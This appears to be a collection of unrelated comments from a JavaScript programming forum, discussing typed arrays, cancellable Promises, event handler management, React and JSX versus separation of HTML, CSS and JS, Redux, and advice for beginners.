fixed length arrays will be faster: `var arr = new Array(100)` vs `var arr = []`, use `arr[i] = ...` vs `arr.push(...)` however, if you want speed, you want typed arrays. https://developer.mozilla.org/en-US/docs/Web/JavaScript/Typed_arrays if you want even more speed, you can use WebGL and GLSL (basically a reduced C subset compiled into a shader kernel from within JS). there is some initial compliation overhead, but if you need to crunch a lot of data the bootup may be worth it. YMMV https://github.com/gpujs/gpu.js
Engage? 
but how can I handle the events through the those two functions? Still, the problem exists.
Alright, I'm not familiar with that particular function. OP was complaining about needing a callback, so I figured that was the only option for it.
Alright, thanks! I'll have to play around with it but at least for data structures containing purely numerical data this looks very promising! 
 //Glassdoor api call app.get('/api/glassdoor/:company', function(req, res, next) { var company = req.params.company; var data; requestify.get('https://api.glassdoor.com/api/api.htm? t.p=PRODUCT&amp;t.k=KEY&amp;userip=0.0.0.0&amp;useragent=&amp;format=json&amp;v=1&amp;action=employers&amp;q=' + company).then(function(response) { // Get the response body data = response.getBody(); data = data.response.employers; //gets only the data about the employers //console.log(data); **giveData(data);** }); console.log(data); //res.send(data); **function giveData(param){ console.log(param); }** }); Can you check if is working what i added with bold, i can't reproduce your code ..but i tried with mine and it works.
If you use Babel that will probably transpile it into a promise or a callback. Which his transpiler probably won't like 
Keep the listeners the whole time. Just have the callbacks themselves have some more intelligence so they can figure out what to do or not to do 
I don't understand why your new properties would mess with the old ones. Could you post code where your think there would be an issue?
From my point of view, it has several significant improvements, and no downsides. I'm using it in production, and I would recommend everyone else do the same, *unless* there's some reason why you can't use yarn. But if you can, you should.
What would you recommend for an input library? Do you have recommendations for any other component, like pre-loading, sprites, physics, particles, camera, etc?
I'm a bit new to the discussion around cancellable Promises, but can anyone explain to me what the benefit is of Promises that can be: 1. `resolved` (successful completion) 2. `rejected` (incomplete, optionally with reason) 3. `cancelled` (incomplete, with the reason "we don't care about the result any more") over just: 1. `resolved` (successful completion) and 2. `rejected` (incomplete, where the reason may be "we just don't care any more") ? At first glance cancelling just seems like a lot of extra complexity to reason about with no clear benefit over a sensible convention like `reject(null)` or `reject(undefined)`.
Nice work ! &amp;nbsp; FYI, on my computer (Ubuntu 14.04, with an ATI GPU), accessing your website (makiopolis.com) is crashing the GPU (and the computer with it).
I've created a little fun chrome extension that makes it snow on every site you visit - taking Christmas to the browser. https://github.com/NorthernTwig/Let-it-snow 
Cancelling promises would be useful to free up resources. One example: if you use a promise to make an API request it would be nice to be able to cancel that request immediately, instead of having no control over it and having to ignore the response instead.
Doesn't rejecting the Promise also free up all resources? **Edit:** Ah, sorry - I see what you mean; you're talking abut the ability to abort the Promise from *outside* the executor function passed to the Promise constructor. Honestly though, this just seems like a good argument to expose resolve()/reject() as instance methods of Promises (`myPromise.reject()`), rather than inventing a whole other parallel mechanism to permit essentially the same thing - no?
Yes but only when the promise is rejected. If you have a promise representing an API request and you want to cancel it immediately, you can't. It would be nice to be able to call promise.cancel(), which would trigger a callback that calls XMLHttpRequest.abort().
Sorry - I quickly edited my comment when I realised what you were arguing, but I think you responded before I finished. ;-) To summarise it again here: instead of adding a whole new mechanism (and attendant complexity), why not just expose a `myPromise.reject()` *instance* method to allow external code to reject a Promise, and handle the XHR.abort() in a `catch()` callback if the rejection error indicates it was cancelled rather than failed any other way?
Yeah. Promises as they stand now are a bad pattern for user-level code cancellation because they're stateful AND eager. Those things together botch the whole enterprise unless cancellation is built into the original constructor. There are better alternatives _to_ Promises if you need cancellation atm, rather than trying to fix Promises directly
You don't hand out the resolve/reject functions. That's actually an antipattern for promises. So if you can't hand that out, you can't ever reject with "we don't care anymore" since who would decide that? The real answer is promises aren't the construct you want if you want to cancel.
&gt; You don't hand out the resolve/reject functions. That's actually an antipattern for promises. Why is that? I noticed that first Bluebird and then ES6 Promises avoided exposing resolve/reject outside of the executor function, but I've never found any explanation as to *why*.
He put a huge amount of thought and work into this. Being given a free reign to do that and then being blocked at the last stage of pushing it forwards, especially by colleagues, is really really rough. I'm grateful for all his work, as this interface is needed badly to move forward a bunch of promise-based APIs.
Promises aren't built that way atm, and due to their stateful/"eager" design, it wouldn't really work in a straightforward way. To have a Promise at all means that the operation to generate its value has already begun by the time you are returned a Promise to run further methods on (like a hypothetical abort). And since Promise constructors don't return anything (or at least expose any return value), there's currently no way "back into" their original scope from downstream (unless you first create, separate/external to the Promise itself) an interface to pass into the constructor: that's what tokens would have been). Worse, the things inside that scope that you might want to cancel themselves have different APIs for cancellation (think an id for running clearTimeout on vs xhr.abort: you need a reference to the id or the xhr to run those methods, as well as knowing which it is, but they don't even exist UNTIL the constructor runs and creates them). If the constructor doesn't return or at least assign those specific methods anywhere, there's no way to access them "later." Worse, you're supposed to be able to take a Promise and treat it as a stateful contract for an immutable future value (or rejection reason). But that means you can, in separate places, chain on a .then() to that Promise and expect to run effects using that same value. But what happens if one of those chains calls abort? What happens to all the other callsites expecting a value to eventually exist or explicitly fail? It's zalgotown. Because Promises mix statefulness (i.e. they represent a container which at some point in time internally changes state from pending to resolved or rejected) with immediate execution, this is a very very tricky problem.
&gt; trying to showcase how much of a fullstack hipster you are. I misread that as "hipstack" at first, and suddenly I feel like I've coined a very relevant term. I wonder if it'll catch on? As in: "He's a hipstack developer."
Yeah; calling setDownHandler() would remove the existing handler and set another. But overall /r/lulzmachine's suggestion is probably the best way to go. Something along the lines... var tools = { pencil: { down: function(event){ /* handle mouse down */ }, up: function(event){ /* handle mouse up */ }, move: function(event){ /* handle mouse move */ } }, circle: { // ... } } canvas.addEventListener("mousemove", function(event){ if(selectedTool) tools[selectedTool].move(event); }); canvas.addEventListener("mousedown", function(event){ if(selectedTool) tools[selectedTool].down(event); }); selectedTool = "pencil"; So you're never changing the event handler, but the handler itself determines what to do based on your selected tool.
Google Analytics is a pretty popular thing to block. 
And, it was amazing. Nice work, brother.
From what I gather, that's exactly how Cancel Tokens are supposed to be used. &gt; The creator of the cancel token is allowed to request cancelation; the consumer of the cancel token *then can respond to these requests*. The examples (such as *xhrAdapted*) show them explicitly having to chain to the Cancel Token and perform the appropriate abort action if the Cancel Token ever resolves. So, in effect, the cancel token is simply a promise. There's no need for this proposal.
&gt; A lot of language manage to do great without it. Other languages do not have JavaScript's object model.
How should we abort a `fetch()` request without a standardized way of cancelling a Promise?
Why was it withdrawn? I liked cancellable Promises because they were parallel to C# Tasks which can also be cancelled.
I'm actually genuinely surprised and a bit relieved with the amount of maturity displayed within the comments here and in the github issues. Let's leave the "daddy issues" jokes for the main subreddits.
What's the need to abort a `fetch()`? Can't you just check if it's still needed when it resolves, and return from the `.then()` at that point? What does the extra complexity of cancellation get us? (not to mention more difficult interop with async/await)
Why would it be nice though? It might just be that I've never hit a situation where that was an issue, but what would really be gained by being able to actually cancel the promise vs just ignore the result when it resolves?
Uh, so that I can free up the resources like the memory used to store the response data as well as the socket connection itself. If I fetch() a 100GB file, but decide that I no longer need the response then I am left with no way to free up those resources. Using an XMLHttpRequest I would be able to abort the request at any time.
Because operations called in the Promise constructor could be very expensive. Large network requests or file reads are two common cases.
we run the CI Builds in there own folder so that side steps the problem
An efficient implementation will involve fromCharCode in some way, so its just a process of elimination! As for actual code, I'm sure you can write a cleaner version of the monstrosity, but the loop idea is absolutely faster than recursion for cases of 2 or more characters. Supposedly future versions of ECMAScript will support TCO, but until then I would stick with the loop.
Your demo doesn't work - is that a local link? You would need to host it somewhere publicly. Also, create a README.md file in your repo and tell us about how it works / what it does?
Hell, I can open it on my ...Android phone, no problem, nice work!
`removeEventlistener` is the way to do it. If you're having problems with inner functions working with `removeEventlistener`, you need to save them off somewhere persistent where they can be referred to later for removal. Alternatively, you could use the `on*` callbacks (like `onclick`). These handlers that can only be defined once, and if you reassign them to a new value, the old one gets replaced. This way, your `one` and `two` functions can skip `add/removeEventListener` in favor of setting the `on` version of the handler, and each time one sets these, it replaces the ones added before, removing as though using `removeEventListener`. function one(){ elem.onclick = function () { console.log('Click one'); } } function two(){ elem.onclick = function () { console.log('Click two'); } } one(); // sets 'Click one' two(); // sets 'Click two' replacing 'Click one'
&gt; but they would be blocked by other Googlers in TC39, so it would be fruitless. That sounds pretty alarming. Does anyone know if the other browser vendors are in a similar position, or can Google just dictate the future of JS?
&gt;He's a fullster developer
What piqued your interest in learning to program to begin with?
I feel like you should make a side project and just work towards its completion. Learning coding from videos or lectures or basically anything other than really making something seems inafective. You can't learn to code by watching someone else code, or from hearing people talk about coding. Moreover, those little challenge sites are good for learning the basics of a language, but if it's not applied it will be hard to know what your "supposed to be learning". What do you want to make? That will dictate what tools are appropriate, and therefore what language to use or skills to learn. Make an application, tool, whatever. It can be a copy of something that already exists. PM me if you need guidance.
In terms of process, implementers do get a good amount of power simply by being able to pick and choose what features to implement and when, but in terms of actual committee power any committee member can block consensus on any item.
If you make it as a developer, you'll realize the language is just a tool and not what makes a developer. In terms of what to do after some intro tutorials, start building something. If you can't figure out what to build (some people suffer from indecisiveness and/or analysis paralysis), then build a tic tac toe game if you want to focus on front end, and a chat application if you want to focus on full stack. After you've done one, do the other, after you've done both, integrate them together and setup muilti-player tic tac toe with player chat. Then add user registration and authorization. This is how you learn to solve problems, along the way you will hit many road blocks, you will have to do research, ask questions, and make decisions on which technologies to use. Those skills are what make a developer. To the OP: I think it's great you are sharing programming with your kid. It's awesome to hear you are also learning something during this process.
I'm going to pretend this didn't happen. I was never here.
I used to do a little coding on some Javascript for an old game called Ultima Online. Mainly just editing code, never anything from scratch. I grew up with a friend whose father was a programmer for bank of America, and we dabbled in making support programs for America Online back in the 3.0 days. I'm just lost and not sure where to go. I guess I should program something that interests me, but I have so many interests again I'd have no idea where to even start. 
Very cool. BTW, from the source at least part of the libraries contain: * Includes all of the following: TweenLite, TweenMax, TimelineLite, TimelineMax, EasePack, CSSPlugin, RoundPropsPlugin, BezierPlugin, AttrPlugin, DirectionalRotationPlugin
The real question, the only question worth discussing, is "what is our goal" ? Separating HTML, JS and CSS is still relatively sane browser-wise, but for coding, the question is, does it make sense to do it together? Can they count as a single concern? Why or why not?
I mean you literally can't have dynamic content without mixing HTML with a language of some sort, and this is an example of React from a tutorial without Redux or another state management tool. I'm sure I could cherry pick some horrid example of whatever this guy's favorite library, framework or pattern is.
Thanks for this post, I like the idea of just making something simple then adding to it. So how would you recommend I go about starting this tic tac toe program? 
It's not "locked with JavaScript". It has a backend that has the passwords encrypted and stored in a database. You're being silly.
Then go write Angular code, where everything is neatly separated in tons of files, and it's PITA to make small changes in a component because you might forget to change something in a related file. I'm gonna keep writing code like that, it's much saner and simpler.
Every time somebody trots that old "Separation of Concerns" horse (especially that HTML/CSS/Javascript nag) out for another walk around the paddock, they always completely fail to demonstrate how it should, in their opinion, be done. 
The thing is, this is not a horrid example, this is literally what's considered "best practice" these days. 
Not knowing what to build is a pretty common problem. I've been programming for 20 years and still struggle to come up with interesting projects. I started a project about 2 years ago and now I am wondering if I've bitten off way more than I can chew. It's hard to come up with a project that is big enough to be useful but small enough that you don't get tired of it before seeing it through. To get around this, a lot of people contribute to open source projects. You're contribution is still useful but the weight of the entire project isn't on your shoulders. Plus there is the added benefit of seeing how others code and possibly learning the idioms of a particular language or domain (provided it is a good code base).
From my experience, it appears that "best practice" is throwing spaghetti against the wall and *whatever sticks* is acceptable. 
Separate HTML, js, templates are separation of technologies, not concerns. People really need to watch https://www.youtube.com/watch?v=x7cQ3mrcKaY
Hear hear. The reason people have stopped following the old best practices isn't because everyone spontaneously lost their mind and decided to reject a decade of wisdom just for the fun of it. It's that they were convinced that the old best practice was flawed and that there are good reasons to favor the new practice. But, hey, someone's really convinced that the old ways are best, nobody's stopping them from writing your code that way. 
Great! So, what would the ideal Angular 1 version of the linked example look like?
I wish I did. There are some projects that I have contributed to in very small ways but I wouldn't recommend a beginner try to contribute to them because it would actually cause you more harm than good. They weren't the most well organized projects. What stage are you at with JS learning wise?
This example actually contains no HTML, and no CSS either... What ends up running on the browser is all JS........ A nice way to represent what eventually comes down to the DOM api is a good thing no? 
I just took a look at the CA JS curriculum and it's hard to gauge from the syllabus exactly what's covered but it seems kinda basic. Did it go over function closures at all? 
I don't recall at the moment if it did or not, but it, and all the other sites are all very basic. Most just cover a little bit if each topic like methods and variables and arrays and the sort. 
How is CSS even relevant here? Inline CSS styling is an HTML thing. You don't have to use it in JSX any more than you'd use it in HTML. The main difference is interaction between HTML, DOM and JS. The very old way is to build DOM using HTML, and then tie it to JS logic by querying the DOM for CSS selectors and attaching event handlers to resulting DOM nodes. The less old way is to build DOM using HTML templating and then tie JS logic to it using magic strings e.g. in "ng-onClick" magic strings. The new way is to build DOM in JS, completely bypassing HTML, and tie JS logic to DOM nodes directly, right when you're building them. Usually this goes through a virtual dom library for performance, but that is strictly speaking not required, and irrelevant for this discussion.
Having written Javascript for the last 20 years, I'm quite surprised that someone wouldn't know who Thomas Fuchs is, I suppose that says more about me than you, however. You whippersnappers and your frameworks. *edit: comma
You can iterate through the object and save the names in buckets: https://jsfiddle.net/uur9o26L/
yeah i saw this when it started and went - nope - not going to participate until there is a solid separation.
We use it in production, it's great.
This is part of that problem solving skill set. A good place to start would be to create the board and handle user clicks. From there it's all about implementing game logic. I'll give you a code sample to get your rolling, but I'd recommend you explore the drawbacks of what I've done here and try to improve on it. https://jsfiddle.net/775ypn1s/ 
Not sure, but it doesn't really take away from my point. Either the Vue approach was great enough for all the big shots to make it a (hopefully) native, or the big shots came up with an approach and it was great enough for Vue to copy it. :) Either way I like it!
*"What changes together, belongs together."* is the rule of thumb I use when organisating code. It has served me well over the years. (I don't know who said it first though.) 
Yeah, I've come around a lot to the way react does things because I find the more useful abstraction to be breaking things down by component vs. js, html, and css. The js and html of a given component likely have more to do with each other than the html for another component, so it doesn't make a ton of sense to mash together all of that HTML when I'm working on it and having to context switch constantly to work on a single component. 
Not really though. This example is setting state in a component rather than using Redux. Writing React without Redux or something similar certainly wouldn't pass for best practices on my projects.
Indeed. And it's a question that the author of this hot take doesn't want to answer, because they're only interested in complaining about React.
This is what I always quote! Too true.
This is the wrong question, as others have pointed out. (Even assuming you mean "html and js", not "html and css") The better question is "Is clear separation of html and js the best way to do web development?" For years that was thought to be the case, but React made a convincing enough counter-argument that a lot of people have changed position.
Then your team doesn't know what the best practices are. Even the creators of Redux and React constantly point out that you don't have to use Redux, and using component state might be fine depending on your situation. [Here's](https://puu.sh/sV2sV/7f4a339b89.png) Dan Abramov (co-creator of Redux) reinforcing that same point just today. I didn't even have to scroll down on my twitter feed to see this. People like you are the reason we see so many people express their distaste towards these programming guidelines and practices. You see a solution, try to apply that solution to literally everything without any common sense, and when that inevitably doesn't work, you conclude that the practice is bad, when the correct answer is that you're trying to use a chainsaw to cut a piece of paper. 
That depends, utilizing pooling can make them faster for certain use cases even with longer allocation
I meant CSS, ops headline implies inline-css is the future, I shudder to imagine trying to reuse/restyle that code. I'm unclear on the vernacular here: If I build js elements and attach them to the page is that un-separated js and HTML? or do they mean php-style replace/attach {your code here} maybe a better question: what were you doing in react that changed your mind?
If the only tool you have is a hammer, every problem tends to look like a nail.
&gt; I'm unclear on the vernacular here: If I build js elements and attach them to the page is that un-separated js and HTML? or do they mean php-style replace/attach {your code here} The idea of "separate HTML and JS" was just that you shouldn't put JS in your HTML (e.g. putting JS code in your event handlers) or HTML in your JS (using JS to construct HTML elements and add them to the page). JSX violates this, since it's all about embedding HTML snippets into JS code. --- The original [React: Rethinking Best Practices](https://www.youtube.com/watch?v=x7cQ3mrcKaY) talk does a great job explaining why React deviated from those practices. Here's [just the slides](http://www.slideshare.net/floydophone/react-preso-v2) if you don't care to watch the whole video.
But keeping them in separate files doesn't automagically make it better. 
They can be used for numbers. So you can do: const a = new Float32Array(10) a[0] = 1 a[1] = 37 const b = a[0] etc. As mentioned, they have more allocation overhead, so they're better suited to large amounts of data or data that persists for a long time. You can also do tricky things like allocate one large buffer and create array views from ranges of that buffer. In the general case (ie. if you're not using audio, video, image or webgl data, or number crunching large sets of data) normal arrays will suffice. I usually don't find myself using patterns that would lead to sparse arrays, accidental or otherwise.
The JSON data is an array of those objects and you just have to count how many are name "john doe"? const data = JSON.parse(json) let numberOfJohn = data.arrayOfObjects.reduce((count, object) =&gt; { if (object.name === "john doe") return count++ return count }, 0)
The goal is to have a maintainable, understandable and performant app that meets your goals. Nothing else matters. Debating about templates vs jsx tends to become philosophical opinions masquerading as wisdom. Build a few apps, see how your team responds and what issues you face, then make a decision.
That fiddle doesn't have valid JSON. There's an object with a random string in it.
The problem with CSS classes is that they're global, so naming collisions will eventually cause styles to apply unexpectedly to other components or to child components if you're not careful. You can limit this by scoping your selectors to the component's class name, and using child selector instead of descendant selector. Inline styles have their own problems (e.g. lack of natural inheritance), and there are libraries that address these to some extent. The actual tweet does not include any CSS because in React inline styles are typically only used for dynamic styling (e.g. to achieve what you'd do with jquery's show/hide methods). Using inline styles everywhere is generally discouraged.
I wish I could upvote you more than once. Thanks to your post I now understand the WHY of JSX. It makes perfect sense now, thanks so much!
&gt;React: Rethinking Best Practices At one point he's suggesting inline styling be used for elements (specifically alternating element colors). There is CSS for styling alternating elements, but assuming he means nested elements, you can still use classes to define those styles instead of adding explicit styles inline. By making your style inline people have to dig through the react code to change style that could have much more easily been changed in the CSS file. I know it sounds like i'm nitpicking here, but it's a big red flag to me when a library/framework claims to be about separation and efficiency creating completely unnecessary extra work for themselves and seem entirely unaware of any alternative. &gt;putting JS code in your event handlers I must be missing something here. what's the alternative? what can you attach to event handlers that isn't JS? &gt;using JS to construct HTML elements and add them to the page you mean, innerHTML vs appendChild? if you're not adding elements to the page, and your not using event listeners, wth *are* you doing with javascript? 
If you really think about it, DOM is an implementation detail and should really be opaque. We've been dealing with it directly because that was the only way, and browsers are optimized for it. Virtualdom is also an implementation detail and is strictly not necessary. Templates and HTML snippets are a bridge to the browser world. Technically you could write a version of react or any other lib that takes any component definition syntax and internally generates markup. It's just that HTML happens to be the most familiar and popular markup.
We're literally getting this {\"Property\":\"Value\"} from a web service. That's why the example has escaped back slashes. 
Ok fair enough. Component state doesn't make sense on any React project I'm involved in. The To-do example is simple enough to get by without it. It's also simple enough to get by without obsessing over separation of concerns as in the original tweet. I shouldn't have implied that not using Redux is wrong. But if you care about separation of concerns, component state probably looks pretty ugly. I still think it's silly to post that example of mixing JS and HTML as if it has set back years of progress.
Because your anonymous function is a callback that doesn't execute until it receives a response. The scoping is fine, the inventory is simply not populated yet.
This "new style", specifically, is ReactJS. And, depending on your application's complexity, it's actually incredibly useful. 
how can I get it to populate?
It likely is populating, but you're asking what's in it *before* it has populated. You just need to wait for the response: }, function(err, resp, body) { var json = JSON.parse(body); inventory.push(json.products_and_categories.new); showInventory(); }); function showInventory() { console.log(inventory); } 
Yes, I know React and React Native. I'm not denying how useful and convenient they can be. I just think they will need to go under serious redesign in the next major releases, because right now they are destroying years of best practices.
I agree with you very fundamentally, although I believe we can at least get to a discussion of some tradeoffs regarding the benefits and drawbacks of those approaches -- specifically, as you said, around maintainability, performance, and .. understandability .... And I would add discoverability.
No more surprising that few people know what scriptaculous is. No one seems to have mentioned it here yet. I think this really is a generational thing. The old folks want to keep doing things the way they know how, because that's worked for them all their lives, and that's how their generation agreed to do things. The young folks recognize that model worked ok, but want to try new and exciting things that may end up being just as good or better. And they want to make a name for themselves in the process, and in order to do that, you have to create new stuff. Then the old folks kneejerk against the new unfamiliar stuff as if the kids are idiots. Because what reasonable person would ever go against the gospel truths established by the parents' generation?
We have a 2million line+ codebase at work for our front end platform alone. That doesn't include the API for that, or the core API behind THAT. So when one of us comes into the frontend codebase needing to change the format of a web page and ONLY that, it's not too big of a deal because they can just ctrl + shift + f "relevant class name" of the div they found in the element picker in chrome. Or they can just guess ctrl + p (filename search) "probably name of .hbs file" and find the relevant file that way, because we are pretty strict about naming our files. This also makes it easy for all our imports. Want to see the view for a given block of html? Just ctrl + shift + f that file name and you'll see where it's required. Want to see the controller for that view? ctrl + shift + f whatever the name of that view file is. If you were the only coder on a project sure, smooshing everything into JS files isn't that big of a deal. I do it at hackathons all the time, I think react is great. But if we were going to use it at work, we'd require some serious time to think about how we can use HTML templating and the like. 
That's because most of these folks aren't in the trenches. They're evangelists and speakers at conferences where they go and talk about stuff and best practices from when they were in the trenches years ago. Some of it's still applicable, some of it's not. (I could name a few names, but you can take some guesses) I guess it's natural that these folks tend to be outspoken, but it does get annoying after a while. They bang the frontend best practices drum like it's immutable gospel truth. Why shouldn't best practices be re-evaluated every ten years or so? Things change - we should at least take the time to see what worked and what didn't. But folks will continue to preach and make names for themselves as speakers and opinion-havers. In all fairness to Thomas, this tweet of his is spot-on and hilarious: https://twitter.com/thomasfuchs/status/708675139253174273
I wonder how many people who are yelling about seperation of concerns are using an MVC framework and writing HTML-based templates on top of that. I would think grouping the same concern should be as important as separating different ones.
Ah, similar to Vue's scoped CSS? Because I love that.
But what happens when I don't *want* my styles to cascade? I write React components as self-contained modules that I can plug into the virtual DOM. I don't mind styling them individually as long as #1 it works and #2 nothing else breaks.
Definitely agree that people should remember that this is someones hard work they're trashing, doesn't make it immune to criticism, but remembering that someone put in a lot of work for it, whether it's perceived as valuable or not. That said, I don't much like the idea of paying being involved, you shouldn't need money to have a voice in any programming community. I'm not sure the problem is with upvote/downvote systems though - however maybe the volume of incoming content makes things hard to be noticed on places such as HN. I think projects are really only going to be super successful when they provide solutions to new problems or old problems in different/better ways. It really needs a strong 'why use this?' imo to reach 'success'.
&gt;whatever this guy's favorite library, framework or pattern is. vanilla javascript
Originally submitted to /r/web_design. Now with swipe support, so better mobile usability
:) I deliberately put it last though because its the least important part (for most apps).
[boy he salty](https://twitter.com/thomasfuchs/status/810936978271309824)
&gt; I still think it's silly to post that example of mixing JS and HTML as if it has set back years of progress. Oh, definitely, I can't argue with that. I don't agree that component state gets in the way of separation of concerns though. Even without redux, you can make a container component that concerns itself with only managing the data, and passes it down to other components that concern themselves with displaying that data. Just because both of those concerns are solved with React components doesn't mean they're not being separated. What's wrong with this code, for example? class App extends React.Component { componentDidMount() { this.loadCats(); } loadCats() { fetch('/api/cats').then(res =&gt; res.json()).then(res =&gt; { this.setState({ cats: res }) }) } render() { return &lt;Cats cats={this.state.cats} /&gt; } } class Cats extends React.Component { render() { return this.props.cats ? ( &lt;div&gt; {this.props.cats.map(cat =&gt; &lt;div&gt;{ cat.name }&lt;/div&gt;)} &lt;/div&gt; ) : ( &lt;Loading /&gt; ); } }
\&gt; he probably thinks React is still "hype"
&gt;question of whether React has value or not. i was under the impression this post was a commentary on nearly all of the framework libraries. &gt;`&lt;button type="button" onclick="doSomething('Foo')"&gt;Foo&lt;/button&gt;` so, you're "ideally separated button" would have no onclick function? your examples depict a "pre-javascript" web. Removing javascript entirely is not a "separation of concerns", you're describing *a completely different medium*. where is the javascript?
Maybe I jumped ahead with already defining this potential system's financial model. I've edited this part a little bit. There are other types of financing. I was just suggesting the one it is used in science. I agree that every project needs a strong 'why use this?' arguments for it to succeed. But, upvote/downvote systems favors those who are already famous or if big companies like facebook and google are behind them. Even if you have the best "why use this?" arguments, it won't be enough if there is no place where you can promote your work. Yes, sometimes reddit, twitter or similar tools are enough. But only if developers that would appreciate your project/article happen to upvote it while it's still "trending".
&gt; i was under the impression this post was a commentary on nearly all of the framework libraries. No, most frameworks (Angular, KO, Ember, Backbone) maintained a far more traditional JS/HTML separation, until React came on the scene. It wasn't until React and JSX showed up that the "keep HTML and JS separate" idea was challenged. &gt; so, you're "ideally separated button" would have no onclick function? &gt; your examples depict a "pre-javascript" web. Removing javascript entirely is not a "separation of concerns", you're describing a completely different medium. &gt; where is the javascript? It's in the JS file, using JS to attach events to the HTML elements. Like this: HTML: &lt;button id="look-ma-no-js"&gt;Pure HTML button&lt;/button&gt; JS: var buttonEl = document.getElementById("look-ma-no-js"); buttonEl.addEventListener("click", function () { doSomething("Foo"); }); This is what "properly separated HTML and JS" has looked like for the last ~15 years. It looks a bit different if you use a framework, but it was always the same idea: HTML in one set of files, JS in others.
And what does that matter if you get the job done quicker, better and less buggy? Better for everyone all-round! I'd say 'best practices' perhaps need updating. 
It's so much better this way.
Also: https://youtu.be/0ZNIQOO2sfA
Redux is pretty horrible. I prefer Elm. :D (half-troll) I also think a React Component and "an Object" are fundamentally similar (although I bet a lot of people don't think of OO that way...) I wrote somewhere else that CSS modules made React a lot more meaningful. I think React is a pretty great idea and we should build a real solid framework on top of it and call it quits.
Well, I don't like it. I can look at JSX and understand perfectly whats going on in the `render()` function, because it's plain Javascript and HTML. Yes, you can mix JS inside the HTML, and it can look awful, but you can also not do it. You can get all your variables and logic ready, in an organized and comprehensible way, **before** returning the HTML. To me, React components are data in -&gt; component out the same way.
Thanks - that makes a lot of sense. Would it be correct, then, to say that the whole idea of a cancellable Promise is inherently wrongheaded? If a Promise is a "future value" and a deferred is "an async task (that may result in a future value)", surely a "cancellable Promise" should really be a deferred. After all, you can cancel a *task* (imperative), but you can't cancel a *value* (declarative), right?
You shouldn't have to take nasty comments, the constructive criticism is valuable and helps people make good products but unkindness is helpful to nobody and only serves to discourage, I feel as a community we can do better, but maybe that's a little idealistic. Having said that, I think what you say doesn't provide a solution to the problem of getting exposure in the first place, to even getting decent amounts of feedback. I'm not sure a journal as suggested in the OP is the right way - especially considering that academic review boards are rarely lauded as great successes - but I'd be interested to see something other than upvote/downvote, because I don't have any solutions myself really.
The same consequences for privately scoped variables in closures. They've been in the language forever, and there is no escape latch unless you use script-specific hacks and get your script in first. That or use something with elevated privileges, like a browser plugin.
Thank you for your advice. Just to be clear, I'm not moaning about some mean comments. It actually motivates me to improve it just like you said. I just think it would be better to advertise project based on a "review system" rather then its popularity. All of the hard work would still had to be done, if published, that project would get even more hate comments. Just as scientist would not stop working on his tests after it's published, he would still benefit from the fact some people would get his attention.
lol what the fuck are you saying. CSS is still separated, instead of having a styles.css you have a styles.js. You import them in the component you want to use. Then you are applying them inline so they don't apply to other elements, but you can still inherit and things like that (even easier, since styles became objects). Not sure what is so hard to understand.
That makes total sense. The pattern of distinguishing between containers and presentational components is in my mind associated with Redux, but it doesn't really belong to either library it's just a standard to adhere to.
Thank you for all the information. I think I may just start with Python, seems to be a lot more active communities supporting it as well which I think I mainly need as a beginner right now. I'm currently working in some web development right now, but it has a user interface kind of thing, I still edit the CSS and such and I've built websites on my own from scratch in the past. Guess I just don't "know what I wanna be when I grow up" and at 33 I feel like I'm running out of time and wished I had started sooner. I need to get chopping. 
Dude, you are missing the point. We can still have multiple layouts, instead of having a styles.css file, we are having a styles.js file .myClass { color: blue } vs var myClassStyle = { color: "blue" } This example is just for the sake of simplicity, we don't have to declare anything global nowadays. We are going to import it and apply it inline. But if we want to make a change it's not on the component itself, and nor in its logic. It's literally the same shit, but we can use JS logic to inherit CSSs and create mixings and etc. We have a bit more power in some aspects. By the way, JSX is really similar to angular templating. Instead of twearking html strings and adding fake directives, we are using html as objects, which gives us better DOM control overall...
Seeing lots of the old "React-is-maintainable" parroting here, but I think Thomas has a point: fat components are relatively common in the wild, and not good for logic reusability, and css-in-js is neither composable nor reusable. Although React can help write better code, it doesn't automagically make *everything* better (and it's still quite possible to jump on bandwagons that don't apply to you, and write bad React code) It'd do a lot of people good to remember that questioning "best practices" is a requirement for continuous improvement, and that remains true even after React came along, and will remain true after the next big thing comes along.
Christ, this again. It's frustrating how little people think about this before taking a stance then sticking to it come hell or high water. Just answer this. Why do you separate HTML, JS, and CSS? Because you do what you do because it's what you do? No, you're a logical person, you see benefits. Write them down, make the list good and complete so you won't want to revisit it. Now, look through a project written in the style of the above code. Does it lack those benefits?
&gt;I don't want my styles to cascade not sure what's so hard about reading...
My concerns are components, not style/markup/javascript.
~~isn't that "attaching JavaScript with JavaScript"?~~ ok, i think you meant "onclick" attribute when you said "no JavaScript in the the event listener". i see. i guess you could develope with no js in the html.. what's the advantage? aren't you adding more work because you need to check that the element you want to attach to exists? ... maybe you're not suggesting it *should* be done this way, rather it *could*..
Web components came first, I heard about them many years ago. VueJS is what, 2 years old? From wikipedia: Web Components were introduced by Alex at Fronteers Conference 2011 for the first time.
hmm I don't want TypeScript in my JavaScript. I think if you really need this kind of (slow poison) OOP in your code, then investigate TypeScript which was built for that type (sic) of thing.
I don't see much problem with that style, no problem mixing concerns, if something goes wrong you can find it one way or the other.
Sadly, it seems you are right on the money.
&gt; thousands of lines of boilerplate for every little thing. [It definitely doesn't have to be](https://medium.com/@benevolentNinja/minimal-redux-setup-e6a10fcbcb68#.6e2htn5uj). People often think you have to create actions / action creators and reducers for every tiny thing in your app, when in reality redux gives you tons of freedom decide how much metadata your state management is wrapped with.
One fundamental problem is that we *can't* separate HTML, CSS and JS completely with some of the more dynamic rendering requirements that we need to meet today. When we were mostly writing static web pages with static styling, and occasionally we'd attach some JS to do some simple action and perhaps change between one clearly identified state and another, that three-way separation mostly worked OK. But now let's say we're writing a modern web app with several different panes showing related information, and the user can drag some sort of sliding divider between panes to resize them. How are we going to represent the size and position of the underlying HTML elements with *any* combination of predetermined CSS rules? We can't, because now we have continuously varying attributes for things like size and position values. Those are necessarily going to be set either by applying inline styles or by directly updating other (non-style) attributes of the relevant elements. These dynamic aspects tend to be few in number, at least in my experience, and I still prefer to predefine most styling using CSS rules the same as always even when I'm working on a more dynamic and interactive page. But sometimes that literally can't do the job. A related consideration that is also relatively rare but valid is that sometimes you want to specify values to use for things like dimensions or colour schemes, but for the same reason as above, you might want to know those values in both CSS and JS contexts. So far I've found this rare enough that I do just define a named constant in both contexts and add comments linking the two, and this has yet to cause any serious problems. However, it's perfectly reasonable to argue, as some do, that this is duplication and a maintenance hazard, and it's perfectly reasonable to explore different tooling that might overcome that duplication.
